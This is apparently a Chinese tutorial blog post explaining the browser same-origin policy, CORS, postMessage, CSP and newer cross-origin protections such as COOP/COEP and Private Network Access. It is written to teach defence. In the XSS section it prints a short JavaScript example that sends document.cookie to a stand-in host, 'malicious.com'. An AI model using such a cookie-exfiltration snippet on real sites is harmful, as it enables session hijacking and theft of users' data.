---
title: "同源策略：为什么XMLHttpRequest不能跨域请求资源"
description: "通过前面 6 个模块的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以最后的 5 篇文章，我们就来系统地介绍下浏览器安全相关的内容。 浏览器安全可以分为三大块——Web 页面安全、浏览..."
date: "2024-04-10"
author: "Kerwin"
tag: "DevOps"
---



> **2025 更新说明**：本文标题中提到的 XMLHttpRequest 仍然是理解同源策略的经典入口，但在现代 Web 开发中，**Fetch API** 已成为发起网络请求的标准方式，同样受到同源策略的约束。近年来，浏览器在跨源安全方面引入了大量新机制，包括 COOP/COEP 跨源隔离策略、Storage Partitioning（存储分区）、Private Network Access（私有网络访问控制）等。本文在原有内容基础上，修正了部分术语并补充了这些现代跨源机制的介绍。

通过前面 6 个模块的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以最后的 5 篇文章，我们就来系统地介绍下浏览器安全相关的内容。

浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全和浏览器系统安全，所以本模块我们就按照这个思路来做介绍。鉴于页面安全的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。

今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，Web 世界是什么样子的呢？

Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频和视频等资源，甚至可以下载其他站点的可执行文件。

Web 世界是开放的，这很符合 Web 理念。但如果 Web 世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。

比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：

- 修改银行站点的 DOM、CSSOM 等信息。

- 在银行站点内部插入 JavaScript 脚本。

- 劫持用户登录的用户名和密码。

- 读取银行站点的 Cookie、IndexedDB 等数据。

- 甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。

所以说，在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保证我们的隐私和数据的安全。

这就引入了页面中最基础、最核心的安全策略：同源策略（Same-origin policy）。

## 什么是同源策略

要了解什么是同源策略，我们得先来看看什么是同源。

如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 time.geekbang.org，以及相同的端口 443，所以我们就说这两个 URL 是同源的。

```
https://time.geekbang.org/?category=1
https://time.geekbang.org/?category=0
```

浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。

具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。

**第一个，DOM 层面**。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。

**第二个，数据层面。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexedDB、LocalStorage 等数据**。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexedDB 或者 LocalStorage 等内容。你可以自己试一下，这里我们就不做演示了。

**第三个，网络层面**。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。你还记得在《17 | WebAPI：XMLHttpRequest 是怎么实现的？》这篇文章的末尾分析的 XMLHttpRequest 在使用过程中所遇到的坑吗？其中第一个坑就是在默认情况下不能访问跨域的资源。

> **补充说明（2025 更新）**：在网络层面，除了 XMLHttpRequest 之外，现代 Web 开发中更常用的 **Fetch API** 同样受到同源策略的约束。Fetch API 提供了更简洁的接口和基于 Promise 的异步模型，但其跨域行为与 XMLHttpRequest 一致——默认情况下不能访问跨域资源，需要通过 CORS 机制来授权跨域访问。

## 安全和便利性的权衡

我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。

不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。

### 1.页面中可以嵌入第三方资源

我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个"口子"，让其任意引用外部文件。

所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。

比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码：

![恶意JavaScript代码](/images/browser/same-origin-policy-why-xhr-cannot-cross-origin/malicious-javascript-code.png)

当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。

除此之外，它还能将页面的敏感数据，如 Cookie、IndexedDB、LocalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：

```js
function onClick() {
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()
```

在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。

以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。

### 2.跨域资源共享和跨文档消息机制

默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。

为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。

#### CORS 机制详解（2025 补充）

CORS 的工作方式比许多开发者想象的要更复杂，这里做一些补充说明：

**简单请求与预检请求**：CORS 将请求分为"简单请求"和"非简单请求"两类。简单请求（GET、HEAD、POST 且 Content-Type 为 `text/plain`、`multipart/form-data` 或 `application/x-www-form-urlencoded`）会直接发送，浏览器在响应中检查 `Access-Control-Allow-Origin` 头。非简单请求（如使用 PUT、DELETE 方法，或携带自定义请求头，或 Content-Type 为 `application/json`）会先发送一个 **OPTIONS 预检请求（Preflight）**，只有服务器在预检响应中明确授权后，浏览器才会发送实际请求。

**Fetch API 的 credentials 选项**：在使用 Fetch API 时，`credentials` 选项控制跨域请求是否携带 Cookie：
- `omit`：不发送 Cookie，即使是同源请求也不发送。
- `same-origin`（默认值）：只在同源请求时发送 Cookie。
- `include`：无论同源还是跨域都发送 Cookie，但服务器必须在响应中设置 `Access-Control-Allow-Credentials: true`，且 `Access-Control-Allow-Origin` 不能使用通配符 `*`。

**`crossorigin` 属性**：HTML 元素（如 `<script>`、`<img>`、`<link>`、`<video>` 等）可以通过 `crossorigin` 属性来控制跨源资源的加载行为。设置 `crossorigin="anonymous"` 会发起不携带凭据的 CORS 请求，`crossorigin="use-credentials"` 会携带凭据。这在使用 CDN 资源时尤为重要，比如要让跨域脚本的错误信息在 `window.onerror` 中完整显示，就需要设置 `crossorigin` 属性。

在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。

### 3.现代跨源安全机制（2025 更新）

随着 Web 平台的发展和新型攻击（如 Spectre 侧信道攻击）的出现，浏览器引入了多种新的跨源安全机制：

#### COOP 和 COEP：跨源隔离

**COOP（Cross-Origin-Opener-Policy）** 和 **COEP（Cross-Origin-Embedder-Policy）** 是一组配合使用的 HTTP 响应头，用于实现"跨源隔离"（Cross-Origin Isolation）。

- **COOP** 控制当前页面与其他窗口（如通过 `window.open()` 打开的页面）之间的关系。设置 `Cross-Origin-Opener-Policy: same-origin` 后，当前页面将与不同源的窗口断开引用关系，防止跨源窗口通过 `window.opener` 进行攻击。

- **COEP** 控制页面加载的跨源资源是否需要显式授权。设置 `Cross-Origin-Embedder-Policy: require-corp` 后，页面只能加载明确授权（通过 CORS 或 `Cross-Origin-Resource-Policy` 头）的跨源资源。

当 COOP 和 COEP 同时设置后，页面进入"跨源隔离"状态，`self.crossOriginIsolated` 返回 `true`。在这个状态下，页面可以安全地使用一些高精度 API（如 `SharedArrayBuffer`、高精度 `performance.now()`），因为浏览器保证该页面的进程不会与潜在的恶意跨源内容共享。

#### 第三方 Cookie 限制与 Storage Partitioning（存储分区）

传统上，第三方 Cookie 可以在不同站点之间共享用户状态，这带来了隐私和安全问题。现代浏览器正在多个维度加强限制：

- **Storage Partitioning（存储分区）**：Firefox 的 State Partitioning（又称 Total Cookie Protection）、Safari 的 ITP、以及 Chrome 的存储分区机制，将第三方存储（Cookie、LocalStorage、IndexedDB、Cache 等）按照顶层站点进行隔离。例如，嵌入在 `site-a.com` 中的 `tracker.com` iframe 和嵌入在 `site-b.com` 中的 `tracker.com` iframe 将拥有各自独立的存储空间，无法共享数据。

- **Partitioned Cookies（CHIPS）**：Chrome 引入的 `Partitioned` Cookie 属性（Cookies Having Independent Partitioned State），允许第三方 Cookie 在保持隔离的前提下仍然可用于合法的跨站嵌入场景（如第三方聊天组件、CDN 负载均衡等）。设置方式为 `Set-Cookie: name=value; Secure; SameSite=None; Partitioned`。

#### Private Network Access（私有网络访问控制）

**Private Network Access**（前身为 CORS-RFC1918）是一项保护用户本地网络资源的安全机制。它防止公共互联网上的网站未经授权地访问用户的内网资源（如路由器管理页面 `192.168.1.1`、本地开发服务器 `localhost` 等）。

具体来说，当一个公共网站（如 `https://evil.com`）试图向用户的私有网络地址发起请求时，浏览器会：

1. 先发送一个 CORS 预检请求（OPTIONS），并带上 `Access-Control-Request-Private-Network: true` 头。
2. 只有当目标服务器在预检响应中返回 `Access-Control-Allow-Private-Network: true` 时，浏览器才允许实际请求。

这有效地防止了 CSRF 攻击和端口扫描等针对本地网络的攻击。Chrome 已在逐步推行此策略，对于不符合要求的请求会显示警告或直接阻止。

## 总结

好了，今天就介绍到这里，下面我来总结下本文的主要内容。

同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。

不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：

- 页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由度。

- 使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。

- 两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。

**在 2025 年的现代浏览器中**，同源策略的防线已经进一步加固：**COOP 和 COEP** 提供了更强的进程级隔离；**Storage Partitioning** 按顶层站点分区存储，阻断了第三方跟踪；**Private Network Access** 保护了本地网络资源不被公共网站探测和攻击。这些新机制共同构建了一个更加安全的 Web 平台，同时在安全性和便利性之间持续寻找新的平衡点。